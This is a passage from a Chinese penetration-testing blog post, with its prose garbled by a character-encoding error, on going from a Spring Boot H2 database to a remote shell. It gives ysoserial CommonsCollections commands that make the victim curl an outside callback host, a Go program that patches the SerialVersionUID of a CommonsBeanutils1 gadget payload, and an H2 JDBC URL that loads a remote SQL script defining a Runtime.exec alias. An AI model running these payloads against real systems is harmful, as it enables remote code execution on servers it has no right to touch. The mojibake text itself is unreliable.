<h3 id="åˆ©ç”¨LDAPè¿”å›ååºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡"><a href="#åˆ©ç”¨LDAPè¿”å›ååºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡" class="headerlink" title="åˆ©ç”¨LDAPè¿”å›ååºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡"></a>åˆ©ç”¨LDAPè¿”å›ååºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡</h3><p>LDAP Serveré™¤äº†ä½¿ç”¨JNDI Referenceè¿›è¡Œåˆ©ç”¨ä¹‹å¤–ï¼Œè¿˜æ”¯æŒç›´æ¥è¿”å›ä¸€ä¸ªå¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®ã€‚å¦‚æœJavaå¯¹è±¡çš„<code>javaSerializedData</code>å±æ€§å€¼ä¸ä¸ºç©ºï¼Œåˆ™å®¢æˆ·ç«¯çš„<code>obj.decodeObject()</code>æ–¹æ³•å°±ä¼šå¯¹è¿™ä¸ªå­—æ®µçš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–ï¼Œæ”»å‡»è€…ä»ç„¶å¯ä»¥åˆ©ç”¨å—å®³è€…æœ¬åœ°CLASSPATHä¸­å­˜åœ¨æ¼æ´çš„ååºåˆ—åŒ–Gadgetè¾¾åˆ°ç»•è¿‡é™åˆ¶æ‰§è¡Œå‘½ä»¤çš„ç›®çš„ã€‚</p>
<p>ä½¿ç”¨CCé“¾å¯ä»¥æµ‹è¯•æˆåŠŸï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class="token string">'curl xbaax2.ceye.io'</span><span class="token operator">|</span>base64 <span class="token operator">|</span>pbcopy
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 <span class="token string">'curl xbaax2.ceye.io'</span><span class="token operator">|</span>base64 <span class="token operator">|</span>pbcopy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>ä½†æ˜¯åœ¨ä½¿ç”¨CBé“¾çš„æ—¶å€™ï¼Œæ‰§è¡Œå‘½ä»¤å¤±è´¥:<br><img src="/2022/03/18/from-spring-boot-to-getshell/3.png"><br>å¯ä»¥ä»æŠ¥é”™åŸå› çœ‹å‡ºæ¥ï¼Œå› ä¸ºCommonsBeanutils1çš„ç‰ˆæœ¬ä¸åŒï¼ŒBeanComparatorè¿™ä¸ªç±»çš„<a target="_blank" rel="noopener" href="https://github.com/kezibei/Urldns/blob/ea7774f9f1e6b1d64000228e82ed33a2f5a252dd/src/main/en.java#L119">SerialVersionUIDä¸ä¸€æ ·</a>ï¼Œä¼šé€ æˆååºåˆ—åŒ–å¤±è´¥ã€‚1.7x-1.8xä¸º<code>-3490850999041592962</code>,1.9xä¸º<code>-2044202215314119608</code>ã€‚<br>æœ‰ä¸¤ç§è§£å†³æ–¹æ³•ï¼š</p>
<ul>
<li>æ›¿æ¢ysoserialçš„CommonsBeanutils1ï¼Œä½¿ç”¨<a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1575">é­”æ”¹ç‰ˆæœ¬çš„ysoserial</a></li>
<li>ç”Ÿæˆååºåˆ—åŒ–æ•°æ®ä¹‹åï¼Œ<a target="_blank" rel="noopener" href="https://github.com/phith0n/zkar">ä¿®æ”¹SerialVersionUID</a>ä¸ºå¯¹åº”ç‰ˆæœ¬çš„å€¼</li>
</ul>
<p>åˆšå¥½æ—©ä¸Šçœ‹åˆ°På¸ˆå‚…å‘çš„æ–‡ç« ï¼Œå°è¯•ä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/phith0n/zkar">zkar</a>ä¿®æ”¹ysoserialç”Ÿæˆçš„åºåˆ—åŒ–æ•°æ®åŒ…ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤æˆåŠŸã€‚</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"github.com/phith0n/zkar/serz"</span>
	<span class="token string">"io/ioutil"</span>
	<span class="token string">"log"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	data<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"cb1.ser"</span><span class="token punctuation">)</span>
	serialization<span class="token punctuation">,</span> err <span class="token operator">:=</span> serz<span class="token punctuation">.</span><span class="token function">FromBytes</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span><span class="token string">"parse error"</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>

	object <span class="token operator">:=</span> serialization<span class="token punctuation">.</span>Contents<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Object
	<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> field <span class="token operator">:=</span> <span class="token keyword">range</span> object<span class="token punctuation">.</span>ClassDatas<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>FieldDatas <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> field<span class="token punctuation">.</span>TypeCode <span class="token operator">==</span> <span class="token string">"L"</span> <span class="token punctuation">&#123;</span>
			classPonter <span class="token operator">:=</span> field<span class="token punctuation">.</span>Object<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>serz<span class="token punctuation">.</span>TCObject<span class="token punctuation">)</span><span class="token punctuation">.</span>ClassPointer
			<span class="token keyword">if</span> classPonter<span class="token punctuation">.</span>Flag <span class="token operator">==</span> serz<span class="token punctuation">.</span>JAVA_TC_CLASSDESC <span class="token operator">&amp;&amp;</span>
				classPonter<span class="token punctuation">.</span>NormalClassDesc<span class="token punctuation">.</span>ClassName<span class="token punctuation">.</span>Data <span class="token operator">==</span> <span class="token string">"org.apache.commons.beanutils.BeanComparator"</span> <span class="token punctuation">&#123;</span>
				classPonter<span class="token punctuation">.</span>NormalClassDesc<span class="token punctuation">.</span>SerialVersionUID <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">3490850999041592962</span>
				<span class="token keyword">break</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>

	ioutil<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span><span class="token string">"cb1-modify.ser"</span><span class="token punctuation">,</span> serialization<span class="token punctuation">.</span><span class="token function">ToBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0o755</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="H2-RCE"><a href="#H2-RCE" class="headerlink" title="H2 RCE"></a>H2 RCE</h3><p>å‚è€ƒsu18å¸ˆå‚…çš„<a target="_blank" rel="noopener" href="https://su18.org/post/jdbc-connection-url-attack/#h2-rce">jdbc-connection-url-attack</a>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;poc.sql&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿œç¨‹æœåŠ¡å™¨çš„æ¶æ„SQL:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> ALIAS <span class="token keyword">EXEC</span> <span class="token keyword">AS</span> <span class="token string">'String shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd);return "su18";&#125;'</span><span class="token punctuation">;</span><span class="token keyword">CALL</span> <span class="token keyword">EXEC</span> <span class="token punctuation">(</span><span class="token string">'open -a Calculator.app'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Spring &lt; 2.3.0çš„æ—¶å€™ï¼Œä¼šé»˜è®¤åˆ›å»º<code>jdbc:h2:mem:testdb</code>ï¼ŒSpring &gt;= 2.3.0çš„æ—¶å€™ï¼ŒSpringä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªUUIDéšæœºæ•°æ®åº“åï¼Œæ•°æ®åº“åå¯ä»¥åœ¨Spirngçš„æ—¥å¿—é‡Œçœ‹åˆ°ã€‚</p>
<p>æ‰€ä»¥ä½¿ç”¨è¿™ç§æ–¹æ³•çš„æ—¶å€™éœ€è¦æ»¡è¶³ä»¥ä¸‹ä»»æ„ä¸€ä¸ªæ¡ä»¶ï¼š</p>
<ul>
<li>Spring &lt; 2.3.0</li>
<li>æå‰è·å–åˆ°H2 databaseçš„ç”¨æˆ·å¯†ç </li>
</ul>
<h2 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><ul>
<li>RMIæ‰˜ç®¡åœ¨VPSçš„æ—¶å€™ï¼Œä¿®æ”¹<a target="_blank" rel="noopener" href="https://github.com/JKme/EvilRMI/blob/main/src/main/java/com/rmi/RmiServer.java#L180">java.rmi.server.hostname</a>ä¸ºè‡ªå·±æœåŠ¡å™¨çš„IPåœ°å€</li>
<li>åœ¨å®Œå…¨é»‘ç›’çš„æƒ…å†µä¸‹ï¼Œæ³¨æ„SerialVersionUIDä¸åŒ¹é…çš„é—®é¢˜ï¼Œå…·ä½“è§<a target="_blank" rel="noopener" href="https://github.com/kezibei/Urldns/blob/ea7774f9f1e6b1d64000228e82ed33a2f5a252dd/src/main/en.java">URLDNS</a></li>
</ul>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul>
<li><a target="_blank" rel="noopener" href="https://81.68.118.217/index.php/archives/62/">JNDIæ³¨å…¥é«˜ç‰ˆæœ¬ç»•è¿‡</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw">Urldnsé“¾æ¢æµ‹ç±»å·¥å…·å‘æ”¾</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA">æ„é€ javaæ¢æµ‹classååºåˆ—åŒ–gadget</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA">è€é“¾æ–°ç”¨ï¼Œåˆ©ç”¨URLDNSé“¾æ¢æµ‹gadget</a></li>
<li><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1575">ysoserial å·¥å…·æ”¹é€ </a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/phith0n/zkar">zkar</a></li>
<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1405/">æ¢ç´¢é«˜ç‰ˆæœ¬JDKä¸‹JNDIæ¼æ´çš„åˆ©ç”¨æ–¹æ³•</a></li>
<li><a target="_blank" rel="noopener" href="https://su18.org/post/jdbc-connection-url-attack">jdbc-connection-url-attack</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/JKme/EvilRMI">https://github.com/JKme/EvilRMI</a></li>
</ul>

	</div>

	
	<span id="/2022/03/18/from-spring-boot-to-getshell.html" class="leancloud-visitors view" data-flag-title="ä»Spring Boot H2 Databaseåˆ°GetShell">
	</span>
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2022/03/21/jndi-exec-by-mvel.html" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2021/08/06/windows-ntlm-smb-scan.html" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2022-03-18 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/Pentest/">Pentest<span>44</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x1-%E5%88%87%E5%85%A5%E7%82%B9"><span class="toc-article-text">0x1. åˆ‡å…¥ç‚¹</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x2-%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8"><span class="toc-article-text">0x2. ç»•è¿‡å’Œåˆ©ç”¨</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0Class%E4%BD%9C%E4%B8%BAReference-Factory%E7%BB%95%E8%BF%87"><span class="toc-article-text">åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factoryç»•è¿‡</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Snkeyml"><span class="toc-article-text">Snkeyml</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Mvel"><span class="toc-article-text">Mvel</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%A9%E7%94%A8LDAP%E8%BF%94%E5%9B%9E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%A7%A6%E5%8F%91%E6%9C%AC%E5%9C%B0Gadget%E7%BB%95%E8%BF%87"><span class="toc-article-text">åˆ©ç”¨LDAPè¿”å›ååºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#H2-RCE"><span class="toc-article-text">H2 RCE</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-article-text">æ³¨æ„äº‹é¡¹</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-article-text">å‚è€ƒé“¾æ¥</span></a></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2022 JKme's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>â¬†ï¸TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
